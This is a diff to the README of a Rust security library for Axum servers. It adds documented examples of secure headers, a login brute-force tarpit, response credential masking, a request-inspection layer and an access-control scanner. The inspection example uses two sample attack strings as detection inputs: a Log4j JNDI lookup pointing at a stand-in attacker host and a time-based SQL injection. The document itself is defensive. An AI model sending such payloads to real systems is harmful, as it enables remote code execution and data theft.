@@ -175,23 +175,102 @@ dispatch_siem_alert(
 );
 ```
 
-### 📋 9. Automated Security & Compliance Auditor CLI
-```bash
-# Run automated OWASP Top 10, SOC2 Type II, and ISO 27001 compliance audit
-cargo rullst audit --compliance
+### 🛡️ 10. OWASP Secure Headers Suite (`rullst-security::headers`)
+```rust
+use rullst_security::{SecureHeadersLayer, SecureHeadersConfig};
+use axum::Router;
 
-# Output: Generates SECURITY_COMPLIANCE.md with full controls evaluation
+// Out-of-the-box A+ score on securityheaders.com
+let app = Router::new()
+    .route("/api/v1/resource", axum::routing::get(handler))
+    .layer(SecureHeadersLayer::default());
+
+// Or with custom CSP and HSTS configuration:
+let custom_config = SecureHeadersConfig::default()
+    .with_hsts(31536000, true)
+    .with_csp("default-src 'self'; script-src 'self' 'nonce-{NONCE}'; object-src 'none';");
+
+let app = Router::new().layer(SecureHeadersLayer::new(custom_config));
+```
+
+### ⏳ 11. Anti-Bruteforce Tarpit & Login Jail (`rullst-security::login_guard`)
+```rust
+use rullst_security::LoginGuard;
+use axum::response::{IntoResponse, Response};
+use axum::http::StatusCode;
+
+async fn login_handler(client_ip: String) -> Response {
+    let guard = LoginGuard::global();
+
+    // Check if IP is currently in the 15-minute penalty jail
+    if guard.is_jailed(&client_ip) {
+        return (StatusCode::TOO_MANY_REQUESTS, "Account/IP temporarily jailed due to repeated failed logins.").into_response();
+    }
+
+    let auth_ok = perform_auth_check();
+    if !auth_ok {
+        // Record failure, trigger progressive tarpit delay (1s to 4s), and jail on 5th failure
+        let delay = guard.record_login_failure(&client_ip);
+        tokio::time::sleep(delay).await;
+        return (StatusCode::UNAUTHORIZED, "Invalid credentials").into_response();
+    }
+
+    // Clear failed attempts on success
+    guard.record_login_success(&client_ip);
+    (StatusCode::OK, "Login successful").into_response()
+}
+```
+
+### 🔒 12. HTTP Response DLP Interceptor (`rullst-security::dlp`)
+```rust
+use rullst_security::{DlpResponseLayer, mask_response_payload};
+use axum::Router;
+
+// Neutralize accidental credential leakage before responses leave the server
+let raw_body = "Error: database connection failed with postgres://admin:secretPass123@db.prod/main";
+let safe_body = mask_response_payload(raw_body);
+// Result: Error: database connection failed with postgres://admin:*****@db.prod/main
+
+// Attach layer to Axum router:
+let app = Router::new()
+    .route("/api/data", axum::routing::get(api_handler))
+    .layer(DlpResponseLayer);
+```
+
+### 🔍 13. RASP Deep Payload & Header Inspector (`rullst-security::rasp`)
+```rust
+use rullst_security::{RaspInspector, RaspSecurityLayer};
+use axum::Router;
+
+// Inspect text payload for JNDI/Log4j, RCE, and advanced SQLi
+let payload = "${jndi:ldap://evil.attacker.com/exploit}";
+assert!(RaspInspector::inspect_text(payload)); // True -> Attack detected
+
+let sql_payload = "SELECT * FROM users WHERE id = 1 AND SLEEP(5);";
+assert!(RaspInspector::inspect_text(sql_payload)); // True -> Attack detected
+
+// Attach zero-latency RASP layer to routes:
+let app = Router::new().layer(RaspSecurityLayer::default());
+```
+
+### 🕵️ 14. Static IDOR / BOLA Vulnerability Scanner (`cargo rullst audit --idor`)
+```bash
+# Recursively scan all parameterized routes (/:id, /{id}, /users/:user_id)
+cargo rullst audit --idor
+
+# Run full audit with AI suggestions and Compliance report:
+cargo rullst audit --ai --compliance --idor
 ```
 
 ---
 
-## 🚀 Full Stack Axum Setup Example
+## 🚀 Full Stack Axum Production Setup Example
 
 ```rust
 use axum::{Router, routing::get, middleware};
 use rullst_security::{
-    HoneypotLayer, HoneypotState, CspSecurityLayer, HtmlSanitizer,
-    RaspSecurityLayer, VaultSecret, schema_guard_middleware,
+    HoneypotLayer, HoneypotState, SecureHeadersLayer, HtmlSanitizer,
+    RaspSecurityLayer, DlpResponseLayer, VaultSecret, schema_guard_middleware,
     cswsh_guard_middleware, rate_limit_middleware, deception_trap_middleware
 };
 
@@ -207,12 +286,13 @@ async fn main() {
             let safe_input = HtmlSanitizer::sanitize("<b>Clean Text</b>");
             safe_input
         }))
+        .layer(DlpResponseLayer)
+        .layer(SecureHeadersLayer::default())
         .layer(middleware::from_fn(rate_limit_middleware))
         .layer(middleware::from_fn(schema_guard_middleware))
         .layer(middleware::from_fn(deception_trap_middleware))
         .layer(middleware::from_fn(cswsh_guard_middleware))
         .layer(RaspSecurityLayer::default())
-        .layer(CspSecurityLayer::default())
         .layer(HoneypotLayer::new(state));
 }
 ```
